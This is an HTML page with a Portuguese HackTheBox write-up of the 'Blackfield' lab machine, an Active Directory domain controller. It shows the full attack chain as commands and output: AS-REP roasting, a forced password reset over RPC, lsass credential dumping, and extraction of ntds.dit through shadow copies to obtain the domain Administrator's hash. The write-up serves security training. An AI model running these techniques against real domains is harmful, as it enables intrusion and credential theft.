@@ -1,0 +1,471 @@
+<!DOCTYPE HTML>
+<html lang="pt" class="sidebar-visible no-js dark">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>HTB-Windows-Hard-Blackfield - WriteUps HackTheBox - by JavaliMZ</title>
+        <!-- Custom HTML head -->
+<!-- Content here gets appended to the <html><head> of all the pages -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script
+	async
+	src='https://www.googletagmanager.com/gtag/js?id=G-ZCM4NEDCZB'
+></script>
+<script>
+	window.dataLayer = window.dataLayer || []; function
+	gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config',
+	'G-ZCM4NEDCZB');
+</script>
+<!-- Custom HTML head: Twitter support -->
+<script
+	async
+	src='https://platform.twitter.com/widgets.js'
+	charset='utf-8'
+></script>
+
+<meta
+	name='google-site-verification'
+	content='g05a2qliKESUMKBSl7XG8sosQoaFtDugS6F9MlUbe1Y'
+/>        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/css/additional.css">
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('dark')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Windows.html"><strong aria-hidden="true">1.</strong> Máquinas Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="HTB-Windows-Easy-Omni.html"><strong aria-hidden="true">1.1.</strong> HTB-Windows-Easy-Omni</a></li><li class="chapter-item "><a href="HTB-Windows-Easy-Sauna.html"><strong aria-hidden="true">1.2.</strong> HTB-Windows-Easy-Sauna</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Resolute.html"><strong aria-hidden="true">1.3.</strong> HTB-Windows-Medium-Resolute</a></li><li class="chapter-item "><a href="HTB-Windows-Medium-Cascade.html"><strong aria-hidden="true">1.4.</strong> HTB-Windows-Medium-Cascade</a></li><li class="chapter-item expanded "><a href="HTB-Windows-Hard-Blackfield.html" class="active"><strong aria-hidden="true">1.5.</strong> HTB-Windows-Hard-Blackfield</a></li><li class="chapter-item "><a href="HTB-Windows-Insane-Bankrobber.html"><strong aria-hidden="true">1.6.</strong> HTB-Windows-Insane-Bankrobber</a></li></ol></li><li class="chapter-item "><a href="Linux.html"><strong aria-hidden="true">2.</strong> Máquinas Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="HTB-Linux-Hard-Falafel.html"><strong aria-hidden="true">2.1.</strong> HTB-Linux-Hard-Falafel</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">WriteUps HackTheBox - by JavaliMZ</h1>
+
+                    <div class="right-buttons">
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><img src="Assets/HTB-Windows-Hard-Blackfield/icon.webp" alt="" /></p>
+<img src="https://img.shields.io/badge/Blackfield-HackTheBox-green?style=plastic" width="200">
+<h1 id="resolução-da-máquina-blackfield"><a class="header" href="#resolução-da-máquina-blackfield">Resolução da máquina <strong>Blackfield</strong></a></h1>
+<h4 id="máquina-hard-hacktheboxcom"><a class="header" href="#máquina-hard-hacktheboxcom">Máquina Hard (hackthebox.com)</a></h4>
+<h4 id="by-javalimz---23092021"><a class="header" href="#by-javalimz---23092021">by <strong><em>JavaliMZ</em></strong> - 23/09/2021</a></h4>
+<hr />
+<hr />
+<h1 id="introdução"><a class="header" href="#introdução">Introdução</a></h1>
+<p>Bem-vindo para mais um Writeup, desta vez da máquina Blackfield. É uma máquina Windows não muito complexa, mas bastante interessante. Em diversos passos, irei reduzir o número de usuários porque já sei quais são os importantes e os que posso eliminar, só mesmo para termos outputs mais &quot;cleans&quot; para o writeup. Mas normalmente nunca é bom apagar informações coletadas às cegas...</p>
+<h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
+<p>Como sempre, quando se enfrenta uma máquina, temos de saber por onde vamos entrar. Para isso, temos de enumerar todas as portas abertas da máquina. Iremos utilizar o clássico nmap para esta tarefa.</p>
+<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
+<pre><code class="language-bash">sudo nmap -sS -p- -n -Pn --min-rate 5000 10.10.10.192 -oG enumeration/allPorts
+
+#&gt;  Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+#&gt;  Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 14:15 WEST
+#&gt;  Nmap scan report for 10.10.10.192
+#&gt;  Host is up (0.042s latency).
+#&gt;  Not shown: 65527 filtered ports
+#&gt;  PORT     STATE SERVICE
+#&gt;  53/tcp   open  domain
+#&gt;  88/tcp   open  kerberos-sec
+#&gt;  135/tcp  open  msrpc
+#&gt;  389/tcp  open  ldap
+#&gt;  445/tcp  open  microsoft-ds
+#&gt;  593/tcp  open  http-rpc-epmap
+#&gt;  3268/tcp open  globalcatLDAP
+#&gt;  5985/tcp open  wsman
+#&gt;  
+#&gt;  Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
+
+nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/nmap-a.txt
+
+#&gt;  # Nmap 7.91 scan initiated Thu Sep 23 14:22:40 2021 as: nmap -p53,88,135,389,445,593,3268,5985 -Pn -sC -sV -oN enumeration/nmap-a.txt -vvv 10.10.10.192
+#&gt;  Nmap scan report for 10.10.10.192
+#&gt;  Host is up, received user-set (0.041s latency).
+#&gt;  Scanned at 2021-09-23 14:22:41 WEST for 49s
+#&gt;  
+#&gt;  PORT     STATE SERVICE       REASON  VERSION
+#&gt;  53/tcp   open  domain        syn-ack Simple DNS Plus
+#&gt;  88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-09-23 20:22:50Z)
+#&gt;  135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+#&gt;  389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+#&gt;  445/tcp  open  microsoft-ds? syn-ack
+#&gt;  593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+#&gt;  3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+#&gt;  5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+#&gt;  |_http-server-header: Microsoft-HTTPAPI/2.0
+#&gt;  |_http-title: Not Found
+#&gt;  Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+#&gt;  
+#&gt;  Host script results:
+#&gt;  |_clock-skew: 7h00m02s
+#&gt;  | p2p-conficker:
+#&gt;  |   Checking for Conficker.C or higher...
+#&gt;  |   Check 1 (port 48702/tcp): CLEAN (Timeout)
+#&gt;  |   Check 2 (port 15434/tcp): CLEAN (Timeout)
+#&gt;  |   Check 3 (port 55985/udp): CLEAN (Timeout)
+#&gt;  |   Check 4 (port 53637/udp): CLEAN (Timeout)
+#&gt;  |_  0/4 checks are positive: Host is CLEAN or ports are blocked
+#&gt;  | smb2-security-mode:
+#&gt;  |   2.02:
+#&gt;  |_    Message signing enabled and required
+#&gt;  | smb2-time:
+#&gt;  |   date: 2021-09-23T20:22:54
+#&gt;  |_  start_date: N/A
+#&gt;  
+#&gt;  Read data files from: /usr/bin/../share/nmap
+#&gt;  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+#&gt;  # Nmap done at Thu Sep 23 14:23:30 2021 -- 1 IP address (1 host up) scanned in 50.65 seconds
+</code></pre>
+<p>Pelas portas abertas, podemos concluir que estamos perante um Domain Controller. Não vemos páginas de internet, nem nenhum programa estranho a rodar, portanto parece que esta máquina só trata de problemas que nos podemos enfrentar em Active Directory / Domain Controller. Posto isso, o primeiro ponto que quero é enumerar usuários.</p>
+<h2 id="smb-anonymous"><a class="header" href="#smb-anonymous">SMB (anonymous)</a></h2>
+<p>Antes de tentar ver o que há nas partilhas, vamos tentar sempre conectar por RPC, visto que por esse protocolo é extremamente fácil enumerar todos os usuários, grupos e muito mais...</p>
+<pre><code class="language-bash">rpcclient 10.10.10.192 -U '' -N
+</code></pre>
+<p>Não me é possível conectar... Vamos então tentar entrar por samba</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.192
+#&gt; SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+</code></pre>
+<p>Ok, já temos algumas informações. Temos o domínio (blackfield.local) e o nome da máquina (DC01).
+vamos adicionar essas informações para o nosso /etc/hosts, para possíveis futuras ferramentas usarem essa informação</p>
+<pre><code class="language-bash">echo -e &quot;10.10.10.192\tblackfield.local dc01.blackfield.local&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<p>Com a ferramenta crackmapexec, temos opção para ver as pastas partilhadas com o parâmetro &quot;--shares&quot;</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.192 --shares
+
+#&gt;  SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+#&gt;  SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
+</code></pre>
+<p>Parece que não está acessível, mas o erro não é o normal desta ferramenta... diz &quot;STATUS_USER_SESSION_DELETED&quot;. Vamos tentar a mesma coisa especificandos login <em>&quot;null&quot;</em> e password <em>&quot;vazio&quot;</em></p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/smb-null.png" alt="smb null session" /></p>
+<p>Agora sim! Vemos duas pastas partilhadas pelo qual podemos aceder. IPC$ e profiles$. IPC$ não tem nada, e profiles$ parece muito mais &quot;feito à unha&quot;. Vamos entrar e ver com smbclient, usando o null session</p>
+<pre><code class="language-bash">smbclient \\\\10.10.10.192\\profiles$ -U 'null'  # Pede a palavra pass. É só dar Enter...
+
+smb: \&gt; dir
+#&gt;    .                                   D        0  Wed Jun  3 17:47:12 2020
+#&gt;    ..                                  D        0  Wed Jun  3 17:47:12 2020
+#&gt;    AAlleni                             D        0  Wed Jun  3 17:47:11 2020
+#&gt;    ABarteski                           D        0  Wed Jun  3 17:47:11 2020
+#&gt;    ABekesz                             D        0  Wed Jun  3 17:47:11 2020
+#&gt;    ...
+#&gt;    ...
+</code></pre>
+<p>A resposta é enorme. Montes de pastas. E essas pastas soa como nomes de pessoas... Temos uns possíveis usuários. Vamos copiar isto tudo e filtrar para guardar apenas o nome da pasta para um ficheiro &quot;users&quot;</p>
+<pre><code class="language-bash">smbclient \\\\10.10.10.192\\profiles$ -U 'null' -N -c &quot;dir&quot; &gt; contents/users
+cat contents/users | awk '{print$1}' | sponge contents/users
+</code></pre>
+<h2 id="as-rep-roasting-attack"><a class="header" href="#as-rep-roasting-attack">AS-REP Roasting Attack</a></h2>
+<p>Agora que temos todos esses usuários, vamos tentar fazer o clássico AS-REP Roasting Attack, para tentar receber um TGT de um usuário que não precisa de requerer a pre-autenticação kerberos. Para isso, nada mais simples que o programa da impacket GetNPUsers.py</p>
+<pre><code class="language-bash">GetNPUsers.py blackfield.local/ -no-pass -usersfile contents/users | grep -v &quot;Client not found in Kerberos database&quot;
+</code></pre>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/getnpusers.png" alt="GetNPUsers.py" /></p>
+<p>Temos um TGT! Esse TGT pode ser decifrado com john-the-ripper ou o hashcat.</p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/crack_support_hash.png" alt="Crack support TGT" /></p>
+<p>Temos uma password do usuário support:</p>
+<blockquote>
+<p>support:#00^BlackKnight</p>
+</blockquote>
+<p>Vamos validar a credential com o crackmapexec</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
+</code></pre>
+<p>Está válido! Já ques estamos em SMB, vamos ver que ganhamos acesso a mais pastas partilhadas</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares
+smbmap -H 10.10.10.192 -u 'support' -p '#00^BlackKnight'
+</code></pre>
+<p>Vemos mais pastas. Mas não há nada de mais... Existe ainda uma pasta partilhada que não temos acesso. A pasta &quot;forensic&quot;. É promissor... mas o que fazer agora? Não podemos avançar por SMB... Pois se não podemos avançar por SMB, podemos voltar uma passo atrás e tentar conectar-nos ao serviço RPC com estas novas credenciais, que já foram validadas pelo crackmapexec. Ainda importante a referir, as credenciais não passaram no teste de validação por winrm...</p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/smb-support.png" alt="Permissões SMB do usuário support" /></p>
+<h2 id="rpc"><a class="header" href="#rpc">RPC</a></h2>
+<p>Vamos então voltar ao primeiro passo. Enumeração via RPC, mas desta vez, com as credenciais do usuário &quot;support&quot;</p>
+<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot;
+</code></pre>
+<p>Bingo! Desta vez tenho resposta. E bem grande! Todos os usuários a nível de domínio!. Isso significa duas coisas. Significa que posso tentar um novo attack AS-RES Roasting, e significa que posso extrair todas as informações de domínio.</p>
+<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]'
+</code></pre>
+<p>Todos os usuários podem ser listados com este comando... mas para limpar um pouco os usuários desnecessários para a resolução da máquina, afim de termos outputs mais &quot;cleans&quot;, vou já eliminar todos os usuários BLACKFIELD*. </p>
+<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]' | grep -v &quot;BLACKFIELD&quot;
+
+#&gt;  Administrator
+#&gt;  Guest
+#&gt;  krbtgt
+#&gt;  audit2020
+#&gt;  support
+#&gt;  svc_backup
+#&gt;  lydericlefebvre
+
+rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c &quot;enumdomusers&quot; | awk '{print$1}' | grep -oP &quot;\[.*?\]&quot; | tr -d '[]' | grep -v &quot;BLACKFIELD&quot; &gt; contents/users
+</code></pre>
+<h2 id="as-rep-roasting-attack-1"><a class="header" href="#as-rep-roasting-attack-1">AS-REP Roasting Attack</a></h2>
+<p>O novo ataque AS-RES Roasting naõ revela mais nada, apenas mostra outro TGT (porque a data/hora/min/seg é usado para gerar cada TGT) do mesmo usuário &quot;support&quot;, mas confirma que todos os outros usuários existem.</p>
+<pre><code class="language-bash">GetNPUsers.py blackfield.local/ -no-pass -usersfile contents/users
+
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+#&gt;  [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+#&gt;  [-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
+#&gt;  [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+#&gt;  [-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
+#&gt;  $krb5asrep$23$support@BLACKFIELD.LOCAL:5baf13a3c031e279852b45cf1ca61281$fac4f6c28409e359a6ec955b32220d549295efce799d7491b8f4efdc0635bec21091ba87b29deb78b404242246e6e110bf33bfae560f61bd791a5f495fec9ecb6894615eaa100c40b2016e979f9545509a5892fef429008c70f6b6f335b968176c6670a94079b0f07f8033fb9c8869928e072b82c63a80c50be46bf574081162cbf2f5185abddcc2acdfa539e1b6c9bda807a045f65b191861a6fec9f169f308e4b4eb3a2766f0e1b3ea770684ead927114c05877fe80c42d6f4a8b7c7d6d3b0374bf936a69ed2311b047708be4a292cb827bf27761612d8ebfc898fab971b313eeaca493d8e2a6320965de255021e7677c6f058
+#&gt;  [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+#&gt;  [-] User lydericlefebvre doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+<h2 id="bloodhound"><a class="header" href="#bloodhound">Bloodhound</a></h2>
+<p>Agora que temos acesso ao RPC, e que podemos extrair todas informações públicas a nível de domínio, podemos tratar de gerar uma base de dados para a nossa ferramenta bloodhound, que já usamos em outras máquinas.</p>
+<pre><code class="language-bash">bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
+
+sudo neo4j start
+bloodhound &amp;&gt;/dev/null &amp;
+disown
+</code></pre>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/Bloodhound-import.png" alt="Bloodhound import" /></p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/Animation.webp" alt="Video Bloodhound" /></p>
+<p>Com a ajuda do BloodHound, vemos que o usuário support tem privilégio &quot;ForceChangePassword&quot; sobre o usuário Audit2020. Isso quer dizer que, podemos alterar a password de Audit2020 sem precisar saber a password actual dele.</p>
+<p>Existem muitas maneiras de se fazer isso localmente, mas a partir de fora, sem RCE, apenas podemos mudar a password por RPC, e validar as novas credenciais...</p>
+<pre><code class="language-bash">rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c 'setuserinfo2 Audit2020 23 J4v4li123!'
+crackmapexec smb 10.10.10.192 -u 'Audit2020' -p 'J4v4li123!'
+</code></pre>
+<h2 id="smb"><a class="header" href="#smb">SMB</a></h2>
+<p>Conseguimos alterar a password com sucesso! O nome do usuário Audit2020 é suspeito de ter qualquer coisa a ver com uma das pastas partilhadas que vimos, a forensic! Vamos verificar se temos acesso</p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/crackmapexec-audit2020.png" alt="Crackmapexec smb Audit" /></p>
+<pre><code class="language-bash">smbclient \\\\10.10.10.192\\forensic -U 'Audit2020%J4v4li123!'
+smb: \&gt; recurse ON
+smb: \&gt; dir
+</code></pre>
+<p>Existem muitas pastas e ficheiros! É impensável descarregar tudo para a nossa máquina. Mas para ser mais fácil percorrer e visualizar a pasta partilhada, é melhor montar esta unidade na nossa própria máquina</p>
+<pre><code class="language-bash">sudo su
+cd /mnt
+mkdir smb
+mount -t cifs //10.10.10.192/forensic /mnt/smb -o username=Audit2020,password=J4v4li123\!,domain=blackfield.local,rw
+# Atenção que a password não leva o sinal &quot;\&quot;, mas está lá para escapar o sinal &quot;!&quot; (para não interpretar o &quot;!&quot;)
+cd smb
+</code></pre>
+<p>A partir de agora estamos sincronizados com a pasta de partilha. Atenção que, por mais que todos os ficheiros estão referenciados como sendo proprietário root, isto não corresponde à verdade. É mais ou menos um link, e um link  no linux tem proprietário e privilégios do seu criador, não do objeto linkado.</p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/mount_forensic.png" alt="SMB Mounted - forensic" /></p>
+<p>Vemos que existe 718 ficheiros espalhados por 38 diretórios... Mas a pasta memory_analysis é muito acolhedor. E lá dentro está um ficheiro lsass.zip. Se dentro desse zip se encontra um minidump de lsass.DMP, isto está maravilhosamente fácil. Para extrair hashes de todos os usuários locais, basta utilizar a ferramenta pypykatz. O resultado do comando é longo, então podemos filtrar por &quot;NT&quot; e &quot;Username&quot;, fazer um &quot;sort&quot; disse tudo, separar os usuários dos hashes, e dar os ingredientes todos para o crackmapexec identificar que hash é de que usuários, e validar logo isto tudo</p>
+<pre><code class="language-bash">cd memory_analysis
+cp lsass.zip /home/javali/CaptureTheFlag/HackTheBox/contents
+cd /home/javali/CaptureTheFlag/HackTheBox/contents
+unzip lsass.zip
+
+pypykatz lsa minidump lsass.DMP &gt; lsass.out
+cat lsass.out | grep -E &quot;NT|Username&quot; | sort -u
+
+#&gt;  domainname NT AUTHORITY
+#&gt;                  NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+#&gt;                  NT: 9658d1d1dcd9250115e2205d9f48400d
+#&gt;                  NT: b624dc83a27cc29da11d9bf25efea796
+#&gt;                  Username:
+#&gt;                  Username: Administrator
+#&gt;                  Username: dc01$
+#&gt;                  Username: DC01$
+#&gt;                  Username: svc_backup
+</code></pre>
+<p>Temos 3 hashes e 2 usuários (o DC01$ não é um usuários... é a máquina.)</p>
+<pre><code class="language-bash">echo -e &quot;7f1e4ff8c6a8e6b6fcae2d9c0572cd62\n9658d1d1dcd9250115e2205d9f48400d\nb624dc83a27cc29da11d9bf25efea796&quot; &gt; tmp_hashes
+echo -e &quot;Administrator\nsvc_backup&quot; &gt; tmp_users
+
+crackmapexec smb 10.10.10.192 -u tmp_users -H tmp_hashes --continue-on-success
+crackmapexec winrm 10.10.10.192 -u tmp_users -H tmp_hashes --continue-on-success
+</code></pre>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/crackmapexec-svc_backup.png" alt="Crackmapexec svc_backup" /></p>
+<p>Temos um único resultado e já está validado. E para além de válido, está <em><strong>Pwn3d!</strong></em> em winrm. Isso quer dizer que temos capacidade de psexec, ou evil-winrm.</p>
+<blockquote>
+<p>svc_backup:9658d1d1dcd9250115e2205d9f48400d</p>
+</blockquote>
+<h1 id="privesc-svc_backup--administrator-de-domínio"><a class="header" href="#privesc-svc_backup--administrator-de-domínio">PrivEsc svc_backup ==&gt; Administrator de domínio</a></h1>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/evil-winrm-svc-backup.png" alt="Evil-WinRM svc_backup" /></p>
+<p>Logo de entrada, vemos com um whoami qual é o caminho a seguir! Este usuário é membro do grupo SeBackupPrivilege. Pelo nome é um pouco normal. Usuários deste grupo tem privilégios para copiar programas que estão em memória RAM, e tem possibilidade de fazer backups de todo o sistema. Não pode abrir tudo &quot;à Lagardère&quot;, mas dá para bypassar isto tudo. Já que iremos ter acesso a todos os ficheiros do sistema, podemos escolher qual queremos. Poderíamos em primeira instância quer extrair o SAM e SYSTEM, mas nesta máquina, e SAM nos daria exactamente igual ao ficheiro lsass que já vimos antes, pelo que a hash do Administrator local não funcionará (nem sei bem o motivo...). Mas há um ficheiro nos Domain Controller que contem a base de dados de todos os usuários de domínio e seus hashes. Esse ficheiro é chamado de &quot;<em><strong>ntds.dit</strong></em>&quot;. E é este o nosso alvo. Para se fazer, basta copiar o referido ficheiro, que se encontra em C:\Windows\NTDS\ntds.dit. Problemas:
+-	O ficheiro está em uso. (não se pode fazer copia do mesmo se está em uso)
+-	Não tenho privilégios diretos. (tenho de usar programas que me fazem ter temporáriamente privilégios Administrador)</p>
+<p>Existe um programa chamado de robocopy, que nos permite resolver o segundo ponto, visto que tem um parametro (/b) para fazer a cópia em backup mode (Passando a ter o privilégio do grupo SeBackupPrivilege) </p>
+<p>O primeiro ponto é mais tricky... Eu não posso copiar um arquivo em uso. Mas posso criar uma unidade que esteja ligada ao meu disco local C:\. O ficheiro em uso será sempre o do disco C:\, e o mesmo ficheiro na outra unidade não estará a ser usado (GG Windows xD).</p>
+<p>Para se fazer:</p>
+<ul>
+<li>Criar um ficheiro com o nome privesc.txt (por exemplo)</li>
+</ul>
+<pre><code class="language-txt">set context persistent nowriters
+add volume c: alias privesc
+create
+expose %privesc% z:
+</code></pre>
+<ul>
+<li>Ajustar compatibilidade do ficheiro para windows</li>
+</ul>
+<pre><code class="language-bash">unix2dos privesc.txt
+</code></pre>
+<ul>
+<li>Transferir privesc.txt para o windows. Via evil-winrm, é facílimo. Privilegie um directório sem nenhum tipo de restrições de escrita (AppLockerBypass)</li>
+</ul>
+<pre><code class="language-bash">cd C:\Windows\System32\spool\drivers\color
+upload /home/javali/CaptureTheFlag/HackTheBox/contents/privesc.txt
+</code></pre>
+<ul>
+<li>Criar uma cópia shadow da unidade C:\ com as configurações do ficheiro privesc.txt</li>
+</ul>
+<pre><code class="language-bash">diskshadow.exe /s .\privesc.txt
+</code></pre>
+<ul>
+<li>Copiar o shadow de ntds.dit para um local acessível no C:</li>
+</ul>
+<pre><code class="language-bash">robocopy /b Z:\Windows\NTDS C:\Windows\System32\spool\drivers\color ntds.dit
+</code></pre>
+<p>Agora temos a tal base de dados de todo o Domian Controller. Para poder ser lido, ainda faltam umas chaves de criptografia que se encontram em HKLM\SYSTEM. Basta gravar a propria memória RAM deste ficheiro em uso para o mesmo local da cópia do ntds.dit (para depois recuperar ambos os ficherio para a nossa máquina, com o commando download do evil-winrm)</p>
+<pre><code class="language-bash">reg save HKLM\system system
+
+download &quot;C:/Windows/System32/spool/drivers/color/system&quot;
+download &quot;C:/Windows/System32/spool/drivers/color/ntds.dit&quot;
+</code></pre>
+<p>Com esse 2 ficheiros, é possível extrair todos os hashes NT dos usuário de domínio</p>
+<pre><code class="language-bash">secretsdump.py -ntds ntds.dit -system system LOCAL &gt; users_domain_hashes
+cat users_domain_hashes | grep &quot;Administrator&quot;
+#&gt;  Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+</code></pre>
+<p>Aqui está. O hash NTLM do usuário Administrator do domínio. Validar com crackmapexec</p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/Administrator.png" alt="WinRM Administrator" /></p>
+<p>Somos donos da máquina! E até de todas as máquina ligadas ao Domain Controller... Mas é apenas um CTF, então é só de esta máquina lol. Com isso, já podemos ver as flags</p>
+<p><img src="Assets/HTB-Windows-Hard-Blackfield/falgs.png" alt="Flags" /></p>
+
+                    </main>
+
